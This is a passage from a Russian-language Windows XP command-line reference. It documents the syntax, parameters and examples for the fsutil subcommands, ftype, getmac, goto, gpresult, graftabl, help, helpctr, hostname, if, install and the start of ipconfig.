NTFS Volume Serial Number : 0xe660d46a60d442cb
Number Sectors : 0x00000000010ea04f
Total Clusters : 0x000000000021d409
Free Clusters : 0x00000000000f222a
Total Reserved : 0x0000000000003550
Bytes Per Sector : 512
Bytes Per Cluster : 4096
Bytes Per FileRecord Segment : 1024
Clusters Per FileRecord Segment : 0
Mft Valid Data Length : 0x0000000003eab000
Mft Start Lcn : 0x0000000000000004
Mft2 Start Lcn : 0x000000000010ea04
Mft Zone Start : 0x0000000000003ea0
Mft Zone End : 0x0000000000004700

Чтобы запросить статистику файловой системы для привода E, введите:

fsinfo statistics E:

Пример выходных данных:

File System Type : NTFS
Version : 1
UserFileReads : 75021
UserFileReadBytes : 1305244512
UserDiskReads : 71213
UserFileWrites : 8037
UserFileWriteBytes : 207685440
UserDiskWrites : 5278
MetaDataReads : 14377
MetaDataReadBytes : 58888192
MetaDataDiskReads : 14773
MetaDataWrites : 18705
MetaDataWriteBytes : 138108928
MetaDataDiskWrites : 21464

MftReads : 9394
MftReadBytes : 38477824
MftWrites : 17061
MftWriteBytes : 115359744
Mft2Writes : 0
Mft2WriteBytes : 0
RootIndexReads : 0
RootIndexReadBytes : 0
RootIndexWrites : 0
RootIndexWriteBytes : 0
BitmapReads : 136
BitmapReadBytes : 557056
BitmapWrites : 1180
BitmapWriteBytes : 11161600
MftBitmapReads : 4
MftBitmapReadBytes : 16384
MftBitmapWrites : 118
MftBitmapWriteBytes : 491520
UserIndexReads : 2938
UserIndexReadBytes : 12034048
UserIndexWrites : 2738
UserIndexWriteBytes : 20615168
LogFileReads : 4
LogFileReadBytes : 16384
LogFileWrites : 8407
LogFileWriteBytes : 180936704
========================================================================================
Fsutil: hardlink

Жесткая связь представляет запись каталога для файла. Каждый файл можно рассматривать как имеющий по крайней мере одну жесткую связь. В томах NTFS каждый файл может иметь несколько жестких связей, таким образом один файл может отображаться во многих папках (или даже в одной папке под разными именами). Поскольку ссылки на все связи находятся в одном файле, программы могут открывать любую из связей и изменять файл. Файл удаляется из файловой системы только после удаления всех связей. После создания жесткой связи, программы могут использовать ее как любое другое имя файла.
Синтаксис

fsutil hardlink create новое_имя_файла существующее_имя_файла
Параметры

create
    Устанавливает жесткую связь NTFS между существующим и новым файлами. Жесткая связь NTFS сходна с жесткой связью POSIX.
новое_имя_файла
    Указывает файл, к которому требуется создать жесткую связь.
существующее_имя_файла
    Указывает файл, от которого требуется создать жесткую связь.

========================================================================================
Fsutil: objectid

Обычно используется специалистами по технической поддержке. Управляет идентификаторами объектов (OID), которые являются внутренними объектами, используемыми службой клиента DLT и службой репликации файлов для отслеживания других объектов: файлов, папок и связей. Идентификаторы объектов невидимы для большинства программ, и их не следует изменять.

Внимание!
- Не следует удалять, задавать или каким-то другим образом изменять идентификатор объекта. Удаление или задание идентификатора объекта может привести к потери данных (от одного файла до целых томов данных). Кроме того, это может вызвать неблагоприятное поведение службы клиента DLT и службы репликации файлов.
Синтаксис

fsutil objectid [create] путь

fsutil objectid [delete] путь

fsutil objectid [query] путь

fsutil objectid [set] ID_объекта ID_тома-источника ID_исходного_объекта ID_домена путь
Параметры

create
    Создает идентификатор объекта, если у файла его еще нет, иначе работает так же, как параметр query.
delete
    Удаляет идентификатор объекта.
query
    Запрашивает идентификатор объекта.
set
    Задает идентификатор объекта.
ID_объекта
    16-разрядный шестнадцатеричный идентификатор файла, являющийся уникальным внутри тома. Используется службой клиента DLT и службой репликации файлов для идентификации файлов. Каждый файл имеет ID_объекта, а также ID_тома-источника, ID_исходного_объекта и ID_домена. При перемещении файла ID_объекта может измениться, а ID_тома-источника и ID_исходного_объекта остаются прежними, что позволяет системе Windows XP всегда найти файл, куда бы он ни был перемещен.
ID_тома-источника
    16-разрядный шестнадцатеричный идентификатор, показывающий том, в котором был расположен файл, когда ему впервые был присвоен ID_объекта. Это значение используется службой клиента DLT.
ID_исходного_объекта
    16-разрядный шестнадцатеричный идентификатор, показывающий исходный ID_объекта файла (ID_объекта может изменяться при перемещении файла). Это значение используется службой клиента DLT.
ID_домена
    16-разрядный шестнадцатеричный идентификатор домена. Это значение не используется в текущий момент, поэтому должно везде быть равно нулю.
путь
    Указывает букву диска (с последующим двоеточием), точку подключения или имя тома.

Примеры

Чтобы создать идентификатор объекта, введите:

fsutil objectid create C:\Temp\sample.txt

Чтобы удалить идентификатор объекта, введите:

fsutil objectid delete C:\Temp\sample.txt

Чтобы запросить идентификатор объекта, введите:

fsutil objectid get C:\Temp\sample.txt

Чтобы задать идентификатор объекта, введите:

fsutil objectid set 40dff02fc9b4d4118f120090273fa9fc f86ad6865fe8d21183910008c709d19e 40dff02fc9b4d4118f120090273fa9fc 00000000000000000000000000000000 C:\Temp\sample.txt
========================================================================================
Fsutil: quota

Управляет дисковыми квотами на томах NTFS, чтобы обеспечить более точный контроль за хранением файлов в сети.
Синтаксис

fsutil quota [disable] имя_тома

fsutil quota [enforce] имя_тома

fsutil quota [modify] имя_тома порог предел [имя_пользователя]

fsutil quota [query] имя_тома

fsutil quota [track] имя_тома

fsutil quota [violations]
Параметры

disable
    Отключает отслеживание и задание квот на указанном томе.
enforce
    Задает использование квот на указанном томе.
modify
    Вносит изменения в существующую дисковую квоту или создает новую квоту.
query
    Перечисляет все существующие дисковые квоты.
track
    Отслеживает использование диска на указанном томе.
violations
    Производит поиск в системе и в журналах приложений и выводит сообщение, что были выявлены нарушения квот или что пользователем достигнут порог или предел квоты.
имя_тома
    Указывает букву для тома (с последующим двоеточием).
порог
    Предельный размер, по достижении которого выдается предупреждение.
предел
    Максимальный допустимый размер занятого места на диске.
имя_пользователя
    Задает имя домена или пользователя.

Примечания
- Дисковые квоты применяются к томам и позволяют задавать жесткие и нежесткие условия хранения данных для каждого пользователя.- Имеется возможность создавать сценарии, которые будут использовать команду fsutil quota для задания пределов квот при каждом добавлении нового пользователя или для автоматического отслеживания пределов квот, составления из них отчета и для автоматической отправки их по электронной почте администратору системы. ========================================================================================
Fsutil: reparsepoint

Обычно используется специалистами по технической поддержке. Запрашивает или удаляет точки повторной обработки, являющиеся объектами файловой системы NTFS, которые имеют определяемый атрибут, содержащий контролируемые пользователем данные, и используются для расширения функциональности подсистемы ввода/вывода. Точки повторной обработки используют как точки соединения каталогов и точки подключения томов. Они также используются драйверами фильтров файловой системы, чтобы пометить определенные файлы как специфические для этого драйвера.
Синтаксис

fsutil reparsepoint [query] путь

fsutil reparsepoint [delete] путь
Параметры

query
    Извлекает данные о точке повторной обработки, связанной с файлом или каталогом, определенным указанным дескриптором.
delete
    Удаляет точку повторной обработки из файла или каталога, определенного указанным дескриптором, но не удаляет файл или каталог.

    Внимание!
    - Команда fsutil reparsepoint delete удаляет только файл, но не удаляет связанные с ним точки повторной обработки. Это может вызвать сбои в процессах или в работе служб, которые попытаются открыть файл. 
путь
    Указывает букву диска (с последующим двоеточием), точку подключения или имя тома.

Примечания
- На томе NTFS файл или каталог могут содержать точку повторной обработки, которая является выборкой определенных пользователем данных. Формат этих данных используется программой, в которой хранятся данные, и фильтром файловой системы, который устанавливается для интерпретации данных и обработки файла. Когда программа задает точку повторной обработки, в программе сохраняются эти данные, также тэг повторной обработки, единственным образом определяющий хранящиеся данные. Когда файловая система открывает файл с повторной точкой обработки, производится попытка найти фильтр файловой системы, связанный с форматом данных, определенным тэгом повторной обработки. Если такой фильтр найден, он производит обработку файла в соответствии с данными повторной обработки. Если фильтр не найден, попытка открыть файл будет неудачной.

Например, точки повторной обработки используются для реализации связей NTFS и удаленного хранилища. Удаленное хранилище использует набор правил, определенных администратором, для перемещения редко используемых файлов в долговременное хранилище, например на магнитную ленту или компакт-диск. Точки повторной обработки также используются для хранения сведений о файле в файловой системе. Эти сведения хранятся в программной заглушке, содержащей точку повторной обработки, данные которой указывают на устройство, где требуемый файл находится в настоящее время. Фильтр файловой системы использует эти сведения для извлечения файла.
Примеры

Чтобы извлечь данные точки повторной обработки, связанные с C:\Server, введите:

fsutil reparsepoint query C:\Server

Чтобы удалить точку повторной обработки из указанного файла или каталога, используйте следующий формат.

fsutil reparsepoint delete C:\Server
========================================================================================
Fsutil: sparse

Управляет разреженными файлами. Разреженным файлом называют файл, внутри которого имеется одна или несколько областей, незанятые данными. Программа будет рассматривать эти незанятые области как содержащие байты с нулевыми значениями, но не будет использовать пространство на диске для представления этих нулей. Другими словами, место выделяется для значимых (ненулевых) данных, тогда как место под незначимые данные (длинные строки, состоящие из нулей) не выделяется. При чтении разреженного файла выделенные данные возвращаются в том виде, в котором они сохранены, а невыделенные данные по умолчанию возвращаются в виде нулей, согласно требованиям спецификации безопасности C2. Поддержка разреженных файлов позволяет воспользоваться данными, записанными в любой чсати файла.
Синтаксис

fsutil sparse [queryflag] путь

fsutil sparse [queryrange] путь

fsutil sparse [setflag] путь

fsutil sparse [setrange] путь начальное_смещение длина
Параметры

queryflag
    Запрашивает разреженные файлы.
queryrange
    Сканирует файл в поисках областей, занятых значимыми (ненулевыми) данными 
setflag
    Отмечает указанный файл как разреженный. 
setrange
    Заполняет нулями указанную область внутри файла. 
путь
    Указывает букву диска (с последующим двоеточием), точку подключения или имя тома.
начальное_смещение
    Указывает смещение (офсет), которое служит отличительным признаком разреженного файла.
длина
    Задает границы (в байтах) области внутри файла, который будет отмечен как разреженный. 

Примечания
- В случае разреженного файла для записи длинных рядов нулей (незначимых данных) может не использоваться дисковое пространство. Достаточное место на диске для значимых данных будет выделено при записи разреженного файла. - Операционная система распознает только те заполненные нулями области, которые имеются в сжатых и разреженных файлах. - Если файл является сжатым или разреженным, файловая система NTFS может освободить дисковое пространство внутри файла. При этом необходимые диапазоны байтов заполняются нулями без увеличения размера файла.
Примеры

Чтобы отметить файл как разреженный, введите, например:

fsutil sparse setflag C:\Temp\sample.txt
========================================================================================
Fsutil: usn

Обычно используется специалистами по технической поддержке. Управляет журналом изменения номеров последовательных обновлений (USN), в котором сохраняется архив всех изменений файлов в томе. При изменении, добавлении или удалении файлов, каталогов и прочих объектов NTFS в данный журнал вносятся соответствующие записи. Такие журналы создаются для каждого тома. Каждая запись содержит сведения о типе изменения и измененном объекте. Новые записи добавляются к концу существующего журнала.

Программы могут обращаться к журналу изменения номеров последовательных обновлений (USN), чтобы использовать данные о всех изменениях определенного набора файлов. Эффективность такого журнала значительно превышает эффективность таких методов, как проверка штампов времени или регистрация уведомлений об изменении файлов. Журнал изменения номеров последовательных обновлений (USN) используется такими службами, как Indexing Service, File Replication Service (FRS), Remote Installation Service (RIS) и Remote Storage.
Синтаксис

fsutil usn [createjournal] максимальный_размер дельта_выделения буква_тома

fsutil usn [deletejournal] флаги буква_тома

fsutil usn [enumdata] начальный_файл нижняя_граница верхняя_граница путь

fsutil usn [queryjournal] буква_тома

fsutil usn [readdata] путь
Параметры

createjournal
    Создает журнал USN. 
m=максимальный_размер
    Задает максимальный размер журнала в байтах. 
a=дельта_выделения
    Задает размер выделения памяти (в байтах), которое удаляется из начала журнала и добавляется в его конец. 
буква_тома
    Указывает букву диска (с последующим двоеточием), точку подключения или имя тома.
deletejournal
    Удаляет или отключает активный журнал USN. 
флаги
    /D: Отключает активный журнал USN с возвратом данных об управлении вводом-выводом в процессе отключения журнала.
    /N: Отключает активный журнал USN с возвратом данных об управлении вводом-выводом после отключения журнала.
буква_тома
    Указывает букву диска (с последующим двоеточием), точку подключения или имя тома.
enumdata
    Перечисляет записи в заданном границами разделе журнала и выводит их список.
начальный_файл
    Задает позицию, с которой будет начато перечисление файлов на томе. 
нижняя_граница
    Задает нижнюю границу диапазона значений USN, которая используется для фильтрации возвращаемых записей. Возвращаются лишь те записи, которые содержат значения дат изменений из диапазона, заданного значениями границ нижняя_граница и верхняя_граница. При этом данному диапазону принадлежат также значения, равные значениям границ. 
верхняя_граница
    Задает верхнюю границу диапазона значений USN, которая используется для фильтрации возвращаемых записей. 
путь
    Указывает букву диска (с последующим двоеточием), точку подключения или имя тома.
queryjournal
    Запрашивает данные по текущему состоянию журнала тома, его емкости и занесенным в него записям.
буква_тома
    Указывает букву диска (с последующим двоеточием), точку подключения или имя тома.
readdata
    Считывает данные о USN, сохраняя их в виде файла.
путь
    Указывает букву диска (с последующим двоеточием), точку подключения или имя тома.

Примечания
- Использование параметра createjournal.

Если журнал тома уже создан, применение параметра createjournal обновит такие его параметры, как максимальный_размер и дельта_выделения. Это дает возможность увеличить число обновляемых записей, которые поддерживает активный журнал, не отключая его. Указание нулевых значений параметров максимальный_размер и дельта_выделения приводит к выбору значения по умолчанию, зависящего от объма тома.
- Использование параметра m=максимальный_размер

Размер журнала USN может превышать указанное посредством данного параметра значение. Однако, при этом журнал усекается по достижении ближайшей контрольной точки NTFS, и его размер становится меньше этого значения. Файловая система NTFS проверяет журнал USN и начинает усекать его, когда размер журнала становится больше, чем сумма значений параметров максимальный_размер и дельта_выделения. Контрольные точки указывают на время занесения записей в файл журнала NTFS. В данной файловой системе они используются для определения методов устранения возможных неполадок.
- Использование параметра a=дельта_выделения

Перед проведением усечения размер журнала USN может превышать сумму значений параметров максимальный_размер и дельта_выделения.
- Использование параметра deletejournal

Удаление или отключение активного журнала может занять очень много времени, так как системе необходимо обработать все записи основной таблицы файлов (MFT) и установить значение последнего атрибута USN равным нулю. Этот процесс может занять несколько минут и, возможно, потребовать перезагрузки системы для продолжения данной процедуры. В ходе ее выполнения журнал USN не считается ни активным, ни отключенным. При выполнении отключения журнала, доступ к нему закрыт, а все попытки обращения к нему приводят к выводу сообщений об ошибках. Отключение активного журнала следует производить с крайней осторожностью, поскольку данная операция может неблагоприятно сказаться на использующих журнал программах.
Примеры

Чтобы создать журнал USN на диске С, введите:

fsutil usn createjournal m=1000 a=100 C:

Чтобы удалить активный журнал USN на диске С, введите:

fsutil usn deletejournal /D C:

Чтобы перечислить записи в заданном границами разделе журнала и ознакомиться с их списком, введите:

fsutil usn enumdata 1 0 1 C:

Чтобы запросить журнал о свободном месте на диске С, введите:

fsutil usn queryjournal C:

Чтобы сохранить данные USN в виде файла во временной папке на диске С, введите следующую команду:

fsutil usn readdata C:\Temp\sample.txt
========================================================================================
Fsutil: volume

Управляет томом. Отсоединяет том или выдает запрос о свободном месте на диске.
Синтаксис

fsutil volume [diskfree] имя_диска

fsutil usn [queryjournal] буква_тома
Параметры

diskfree
    Выдает запрос о свободном месте тома.
имя_диска
    Указывает букву диска (с последующим двоеточием).
dismount
    Отсоединяет том.
буква_тома
    Указывает букву диска (с последующим двоеточием), точку подключения или имя тома.

Примеры
- Чтобы отсоединитье том на диске С, введите:

fsutil volume dismount C:
- Чтобы выполнить запрос о свободном месте на диске С, введите:

fsutil volume diskfree C:
========================================================================================
Ftype

Вывод или редактирование связи между типом файла и его расширением. Для просмотра текущих назначений служит команда ftype без параметров.
Синтаксис

Ftype [тип_файла[=[команда_открытия]]]
Параметры

тип_файла
    Задает тип файла.
команда_открытия
    Задает команду для открытия файлов данного типа.
/?
    Отображение справки в командной строке.

Заметки
- В команде_открытия команда ftype использует следующие подстановки переменных: - %0 или %1 замещаются именем открываемого файла. - %* замещается всеми параметрами - %~n замещаются всеми остальными параметрами, начиная с n-го параметра, где n — любое число от 2 до 9. - %2 замещается первым параметром, %3 — вторым и т. д.
Примеры

Чтобы просмотреть текущие типы файлов, для которых определены команды открытия, введите:

ftype

Чтобы просмотреть текущую команду открытия для определенного типа файла, введите:

ftype тип_файла

Чтобы удалить команду открытия для определенного типа файла, введите:

ftype тип_файла=

Введите
ASSOC .pl=PerlScript FTYPE PerlScript=perl.exe %1 %*

Чтобы вызвать сценарий Perl, введите:

script.pl 1 2 3

Чтобы избавиться от необходимости ввода расширений, введите:
set PATHEXT=.pl;%PATHEXT%

Чтобы вызвать сценарий Perl, введите:
script 1 2 3 
========================================================================================
Getmac

Возвращает аппаратный (MAC) адрес и список сетевых протоколов, связанных с каждым адресом для всех сетевых плат в любом компьютере — как локальном, так и доступном по сети.
Синтаксис

getmac[.exe] [/s компьютер [/u домен\пользователь [/p пароль]]] [/fo {TABLE|LIST|CSV}] [/nh] [/v]
Параметры

/s компьютер
    Имя или IP-адрес удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Выполнение команды с разрешениями учетной записи пользователя, который указан как пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Пароль учетной записи пользователя, заданной параметром /u.
/fo {TABLE|LIST|CSV}
    Формат выходных данных запроса. Допустимые значения: TABLE, LIST и CSV. По умолчанию для выходных данных используется формат TABLE. 
/nh
    Запрет на вывод заголовка столбца. Данный параметр является допустимым, если параметр /fo имеет значение TABLE или CSV.
/v
    Вывод подробных сведений.
/?
    Отображение справки в командной строке.

Заметки
- Команду Getmac полезно использовать, если требуется ввести MAC-адрес в сетевой анализатор либо требуется определить, какие протоколы используются каждой сетевой платой компьютера.
Примеры

Далее приведены примеры использования команды getmac:

getmac /fo table /nh /v
getmac /s srvmain
getmac /s srvmain /u maindom\hiropln
getmac /s srvmain /u maindom\hiropln /p p@ssW23
getmac /s srvmain /u maindom\hiropln /p p@ssW23 /fo list /v
getmac /s srvmain /u maindom\hiropln /p p@ssW23 /fo table /nh
========================================================================================
Goto

В пакетной программе передает управление Windows XP в строку, определенную меткой. Когда метка найдена, выполнение продолжается со следующей за ней строки.
Синтаксис

goto метка
Параметры

метка
    Строка в пакетной программе, к которой выполняется переход.
/?
    Отображение справки в командной строке.

Заметки
- Работа с расширениями команды

Если расширения команды включены (по умолчанию они включены) и в команде goto используется метка :EOF, управление будет передано в конец файла текущего пакетного сценария для выхода из него без назначения метки. Когда используется команда goto с меткой :EOF, перед меткой должно быть вставлено двоеточие. Пример:

goto :EOF

Описание расширений команды call, включающих эту возможность, см. в разделе cmd ссылки «».
- Использование допустимых значений метки

Метка может включать пробелы, но не может включать другие разделители, такие как точка с запятой или знак равенства. В команде goto используются только первые восемь знаков метки. Например, следующие метки эквивалентны и рассматриваются как :hithere0:

:hithere0

:hithere01

:hithere02
- Совпадение меток в пакетных программах

Метка, заданная в команде, должна соответствовать метке в тексте пакетной программы. Метка в пакетной программе должна начинаться с двоеточия (:). В Windows XP строка пакетной программы, начинающаяся с двоеточия (:), опознается как метка и не обрабатывается как команда. Если строка начинается с двоеточия, все присутствующие в ней команды обработаны не будут. Если в пакетном файле не содержится заданной метки, программа будет остановлена, а на экран будет выведено следующее сообщение:

Метка не найдена.
- Использование команды goto для обработки условий

Команду goto можно использовать совместно с другими командами для выполнения операций с условиями. Чтобы получить дополнительные сведения об использовании команды goto для обработки условий, выберите раздел if из списка в ссылке «».
Примеры

Следующая пакетная программа форматирует диск в дисководе A как системный диск. Если форматирование прошло успешно, команда goto передает управление Windows XP на метку :end.

echo off
format a: /s
if not errorlevel 1 goto end
echo Ошибка при форматировании.
:end
?echo конец пакетной программы.
========================================================================================
Gpresult

Отображение параметров групповой политики и результирующей политики (RSOP) для пользователя или компьютера.
Синтаксис

gpresult [/s компьютер [/u домен\пользователь /p пароль]] [/user имя_конечного_пользователя] [/scope {user|computer}] [/v] [/z]
Параметры

/s компьютер
    Имя или IP-адрес удаленного компьютера. (Не используйте обратную косую черту.) По умолчанию используется локальный компьютер.
/u домен\пользователь
    Выполнение команды с разрешениями учетной записи пользователя, который указан как пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Пароль учетной записи пользователя, заданной параметром /u.
/user имя_конечного_пользователя
    Имя пользователя, для которого требуется просмотреть данные RSOP.
/scope {user | computer}
    Отображение результатов для параметра user или computer. Допустимыми значениями параметра /scope являются user или computer. Если опустить параметр /scope, результаты gpresult будут выданы для параметров user и computer.
/v
    Вывод подробных сведений о политике.
/z
    Вывод всех доступных сведений о групповой политике. Поскольку при использовании этого параметра выдается больше сведений, чем при использовании параметра /v, рекомендуется перенаправлять вывод в текстовый файл (например gpresult /z >policy.txt).
/?
    Отображение справки в командной строке.

Заметки
- Оснастка «Групповая политика» — это основной инструмент администратора для определения и управления параметрами работы программ, сетевых ресурсов и операционной системы для пользователей и компьютеров организации. В среде Active Directory групповая политика применяется к пользователям или компьютерам на основе их принадлежности к узлам, доменам или организационным подразделениям.- Поскольку к любому компьютеру или пользователю можно применять перекрывающиеся уровни политик, групповая политика при входе в систему создает результирующую политику. Gpresult отображает результирующую политику, действующую на компьютере для указанного пользователя после входа в систему.
Примеры

Далее приведены примеры использования команды gpresult:

gpresult /user targetusername /scope computer
gpresult /s srvmain /u maindom\hiropln /p p@ssW23 /user targetusername /scope USER
gpresult /s srvmain /u maindom\hiropln /p p@ssW23 /user targetusername /z >policy.txt
gpresult /s srvmain /u maindom\hiropln /p p@ssW23
========================================================================================
Graftabl

Служит для включения возможности отображения расширенного набора символов в графическом режиме.
Синтаксис

graftabl [xxx] [/status]
Параметры

xxx
    Задает кодовую страницу, для которой обеспечивается вывод расширенных символов. Ниже приведены существующие кодовые таблицы с соответствующими странами/регионами или языками:
    Значение     Страна/регион
    437     США
    850     Многоязычная (латиница I)
    852     Восточная и центральная Европа (латиница II)
    855     Кириллица (русский)
    857     Турецкий
    860     Португальский
    861     Исландский
    863     Французский (Канада)
    865     Скандинавский
    866     Русский
    869     Современный греческий
/status
    Кодовая страница, используемая graftabl.
/?
    Отображение справки в командной строке.

Заметки
- Чтобы получить сведения об использовании кодовых страниц, выберите chcp или mode (установка кодовых страниц устройства) из списка в ссылке «». - Команда Graftabl не влияет на кодовую страницу, используемую при вводе. Команда Graftabl определяет только вывод на монитор расширенных символов указанной кодовой страницы. Для смены кодовой страницы следует использовать команды mode и chcp. - Коды завершения команды graftabl

В следующей таблице перечислены коды завершения с кратким описанием.
Код завершения     Описание
0     Набор символов успешно загружен. Ранее кодовая страница загружена не была.
1     Задан недопустимый параметр. Никакое действие выполнено не было.
2     Возникла ошибка файла.
- В пакетных программах можно использовать параметр errorlevel команды if для анализа кода завершения команды graftabl.
Примеры

Для загрузки графических символов кодовой страницы 437 (США) в память служит следующая команда:

graftabl 437

Для загрузки графических символов кодовой страницы 850 (многоязычной) в память служит следующая команда:

graftabl 850
========================================================================================
Графика
========================================================================================
Справка

Служит для просмотра описаний системных (т. е. не сетевых) команд. При вызове без параметров команда help выводит список всех системных команд с краткими описаниями.
Синтаксис

{help [команда]|[команда]/?}
Параметры

команда
    Команда, сведения о которой требуется получить.

Заметки
- Существует два способа получения интерактивной справки с помощью команды help. Можно ввести help команда или команда /?. При использовании параметра /? вывод справка осуществляется быстрее. - Для получения сведений о сетевых командах выберите раздел net help в списке ссылки «».
Примеры

Чтобы просмотреть сведения о команде xcopy, введите одну из следующих команд:

help xcopy
xcopy /?
========================================================================================
Helpctr

Запуск справки и поддержки. При вызове без параметров команда helpctr открывает домашнюю страницу центра справки и поддержки.
Синтаксис

helpctr [/url [адрес_URL]] [/mode [адрес_URL]] [/hidden] [/fromstarthelp]
Параметры

/url [адрес_URL]
    Адрес URL, который требуется открыть в центре справки и поддержки.
/mode [адрес_URL]
    Файл определения языка наращиваемой разметки (XML), поддерживающий схему Launch_Description.dtd, управляющую контекстом, макетом и содержанием центра справки и поддержки.
/hidden
    Запуск центра справки и поддержки без отображения пользовательского интерфейса. С помощью данной команды можно загрузить раздел. Она используется для удаленного администрирования выполнения сценария.
/fromstarthelp
    Запуск нового экземпляра центра справки и поддержки.
/?
    Отображение справки в командной строке.

Заметки
- Использование атрибута адрес_URL

При использовании параметра /url или /mode атрибут адрес_URL можно заключать в кавычки (т. е. "адрес_URL"). If a space exists within URL, replace it by typing %20 (that is, "URL%20Address").
Примеры

Чтобы запустить сеанс удаленного помощника с помощью файла .msrincident, введите:

HelpCtr /mode "hcp://CN=Microsoft%20Corporation,L=Redmond,S=Washington,C=US/Remote%20Assistance/RAClientLayout.xml" /url "hcp://CN=Microsoft%20Corporation,L=Redmond,S=Washington,C=US/Remote%20Assistance/Interaction/Client/rctoolScreen1.htm?IncidentFile=rahelp.msrincident"
========================================================================================
Hostname

Отображение имени узла, входящего в состав полного имени компьютера.
Синтаксис

hostname
Параметры

/?
    Отображение справки в командной строке.

Заметки
- Для получения дополнительных сведений о задании полного имени компьютера щелкните ссылку «».- Эта команда доступна, только если в свойствах сетевого адаптера в объекте Сетевые подключения в качестве компонента установлен протокол Интернета (TCP/IP).
Примеры

Чтобы просмотреть имя компьютера, введите:

hostname
========================================================================================
If

Обработка условий в пакетных программах.
Синтаксис

if [not] errorlevel число команда [else выражение]

if [not] строка1==строка2 команда [else выражение]

if [not] exist имя_файла команда [else выражение]

Если расширения командного процессора разрешены, следует использовать следующий синтаксис:

if [/i] строка1 оп_сравнения строка2 команда [else выражение]

if cmdextversion число команда [else выражение]

if defined переменная команда [else выражение]
Параметры

not
    Задает выполнение команды только в случае невыполнения условия.
errorlevel число
    Условие выполняется, если предыдущая команда, обработанная интерпретатором команд Cmd.exe, завершилась с кодом, равным или большим числа.
команда
    Команда, которая должна быть обработана в случае выполнения условия.
строка1==строка2
    Условие выполняется, если строки строка1 и строка2 совпадают. Строки могут быть заданы явно или могут быть пакетными переменными (например, %1). Явно заданные строки нет необходимости заключать в кавычки.
exist имя_файла
    Условие выполняется, если существует файл с именем имя_файла.
оп_сравнения
    Трехзначный оператор сравнения. В следующей таблице перечислены допустимые значения оп_сравнения.
    Оператор     Описание
    EQU     равно
    NEQ     не равно
    LSS     меньше
    LEQ     меньше или равно
    GTR     больше
    GEQ     больше или равно
/i
    Сравнение строк без учета регистра знаков. Параметр /i можно использовать в конструкции string1==string2 команды if. Эти сравнения являются общими. Если и строка1, и строка2 состоят из цифр, строки преобразовываются в числа и выполняется сравнение чисел.
cmdextversion число
    Условие выполняется, только если номер внутренней версии, связанный с расширениями командного процессора Cmd.exe, равен или больше числа. первая версия имела номер 1. Номер версии увеличивается на 1 при внесении в расширения командного процессора значительных изменений. Условие с cmdextversion не выполняется, если расширения командного процессора запрещены (по умолчанию они разрешены).
defined переменная
    Условие выполняется, если переменная определена.
выражение
    Команда и все ее параметры для обработке в командной строке при выполнении оператора else.
/?
    Отображение справки в командной строке.

Заметки
- Если условие, заданное в команде if, выполняется, будет выполнена команда, следующая за условием. Если условие не выполняется, команда, заданная в операторе if, пропускается, а управление переходит к команде оператора else, если она задана. - Когда программа завершается, она возвращает код завершения. С помощью параметра errorlevel коды завершения можно использовать в качестве условий. - Использование команды defined переменная

При использовании команды defined переменная добавляются следующие три переменные: %errorlevel%, %cmdcmdline% и %cmdextversion%.

%errorlevel% замещается строковым представлением текущего значения errorlevel, если только уже не существует переменная среды с именем ERRORLEVEL. В этом случае будет использовано ее значение. В следующем примере показано использование значения errorlevel после выполнения пакетной программы:

goto answer%errorlevel%
:answer0
echo Код возврата программы равен 0
:answer1
echo Код возврата программы равен 1
goto end
:end
echo Готово!

Операторы сравнения оп_сравнения также можно использовать следующим образом:

if %errorlevel% LEQ 1 goto okay

%cmdcmdline% замещается исходной командной строкой, переданной Cmd.exe, до ее обработки в Cmd.exe, если только уже не существует переменная среды с именем cmdcmdline. В этом случае будет использовано значение cmdcmdline.

%cmdextversion% замещается строковым представлением текущего значения cmdextversion, если только уже не существует переменная среды с именем CMDEXTVERSION. В этом случае будет использовано ее значение.
- Использование оператора else

Оператор else должен размещаться в той же строке, что и команда if. Пример:

IF EXIST имя_файла. (
del имя_файла.
) ELSE (
echo имя_файла. отсутствует.
)

Приведенный ниже пример не будет работать, поскольку команда del должна заканчиваться новой строкой:

IF EXIST имя_файла. del имя_файла. ELSE echo имя_файла. отсутствует

Приведенный ниже пример не будет работать, поскольку команда else должна находиться в той же строке, что и команда if:

IF EXIST имя_файла. del имя_файла.
ELSE echo имя_файла. отсутствует

Если необходимо разместить всю инструкцию в одной строке, можно использовать следующую правильную форму исходной инструкции:

IF EXIST имя_файла. (del имя_файла.) ELSE echo имя_файла. отсутствует

Примеры

Если файл Product.dat не удается найти, появится следующее сообщение:

if not exist product.dat echo Не найден файл данных

Если в приведенном ниже примере при форматировании диска в дисководе A возникнет ошибка, будет выведено сообщение об ошибке:

:begin
@echo off
format a: /s
if not errorlevel 1 goto end
echo Ошибка при форматировании.
:end
echo Конец пакетной программы.

Если ошибка не возникнет, сообщение об ошибке выведено не будет.

Команда if не может быть использована непосредственно для проверки существования каталога, но в каждом каталоге существует устройство (NUL). Следовательно, существование каталога может быть проверено, как показано ниже. В следующем примере проверяется наличие каталога:

if exist c:mydir\nul goto process
========================================================================================
Install

Служит для загрузки резидентных программ в память. Для указания программы, которую требуется установить, используйте файл системный_корневой_каталог\System32\Config.nt или эквивалентный файл запуска.
Синтаксис

install=[диск:][путь] имя_файла [параметры_команды]
Параметры

[диск:][путь] имя_файла
    Имя и местоположение файла резидентной программы для загрузки.
параметры_команды
    Параметры, передаваемые программе имя_файла.
/?
    Отображение справки в командной строке.

Заметки
- Команда install следует использовать для загрузки в память резидентной программы непосредственно перед вызовом приложений, для работы которых она необходима. Если резидентная программа загружается в память из файла Autoexec.nt, она будет загружаться при запуске каждого экземпляра командного интерпретатора, что приведет к лишнему расходу памяти. - Команда install не может применяться для загрузки программ, использующих переменные окружения, клавиши быстрого вызова или требуют наличия командного интерпретатора Cmd.exe для обработки критических ошибок.
Примеры

Для загрузки программы в память из файла Config.nt используется следующая команда:

install
========================================================================================
Ipconfig

Служит для отображения всех текущих параметров сети TCP/IP и обновления параметров DHCP и DNS. При вызове команды ipconfig без параметров выводится только IP-адрес, маска подсети и основной шлюз для каждого сетевого адаптера.
Синтаксис

ipconfig [/all] [/renew [адаптер]] [/release [адаптер]] [/flushdns] [/displaydns] [/registerdns] [/showclassid адаптер] [/setclassid адаптер [код_класса]]
Параметры

/all
